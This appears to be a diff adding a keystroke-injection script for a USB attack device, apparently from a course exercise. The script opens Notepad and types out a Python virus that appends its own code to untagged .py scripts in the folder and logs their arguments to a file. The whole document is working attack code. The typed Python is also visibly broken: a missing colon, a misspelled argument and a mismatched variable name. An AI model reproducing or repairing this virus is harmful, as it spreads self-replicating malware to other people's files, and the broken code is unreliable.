@@ -1,0 +1,121 @@
+GUI r
+DELAY 500
+STRING notepad.exe
+ENTER
+DELAY 1000
+CTRL n
+DELAY 1000
+STRING import os
+ENTER
+STRING import sys 
+ENTER
+STRING TAG = '#infected'
+ENTER
+STRING def payload()
+ENTER
+STRING  with open ("Q1C.out", "a") as f:
+ENTER
+STRING   f.write(' '.join(sys.argv)+'\\n')
+ENTER
+STRING def isScript(file):
+ENTER
+STRING  with open (file, "r") as f:
+ENTER
+STRING   if 'if __name__ == "__main__":' in f.read():
+ENTER
+STRING    return True
+ENTER
+STRING  return False
+ENTER
+STRING def is_infected(filename):
+ENTER
+STRING  with open (filename, 'r') as file:
+ENTER
+STRING   content = file.read()
+ENTER
+STRING  return TAG in content
+ENTER
+STRING def infect_file(filename):
+ENTER
+STRING  with open (filename, 'r') as file:
+ENTER
+STRING   content = file.read()
+ENTER
+STRING  if TAG not in content:
+ENTER 
+STRING    pay_load = f"""
+ENTER
+STRING {TAG}
+ENTER
+STRING  import sys 
+ENTER
+STRING  TAG = '#infected'
+ENTER
+STRING  with open ("Q1C.out", "a") as f:
+ENTER
+STRING   f.write(' '.join(sys.argv)+'\\n')
+ENTER
+STRING  def isScript(file):
+ENTER
+STRING   with open (filem "r") as f:
+ENTER
+STRING    if 'if __name__ == "__main__":' in f.read():
+ENTER
+STRING     return True
+ENTER
+STRING   return False
+ENTER
+STRING  def is_infected(filename):
+ENTER
+STRING   with open (filename, 'r') as file:
+ENTER
+STRING    content = file.read()
+ENTER
+STRING   return TAG in content
+ENTER
+STRING  def infect_file(filename):
+ENTER
+STRING   with open(__file__, 'r+') as current:
+ENTER
+STRING    toWrite = current.read()
+ENTER
+STRING   with open(filename, 'r+') as file:
+ENTER
+STRING    file.write(toWrite)
+ENTER
+STRING  import os
+ENTER
+STRING  allFiles = [f for f in os.listdir() if f.endswith('.py')]
+ENTER
+STRING  for file in allFiles:
+ENTER
+STRING   if not is_infected(file) and isScript(file):
+ENTER
+STRING    infect_file(file)"""
+ENTER
+STRING   infected_content = content + payload_code
+ENTER
+STRING   with open(filename, 'w') as file:
+ENTER
+STRING    file.write(infected_content)
+ENTER
+STRING def main():
+ENTER
+STRING  allFiles = [f for f in os.listdir() if f.endswith('.py')]
+ENTER
+STRING  for file in allFiles:
+ENTER
+STRING   if not is_infected(file) and isScript(file):
+ENTER
+STRING    infect_file(file)
+ENTER
+STRING if __name__ == "__main__": main()
+ENTER
+DELAY 500
+CTRL s
+DELAY 1000
+STRING infected.py
+ENTER
+DELAY 500
+LEFTARROW
+ENTER
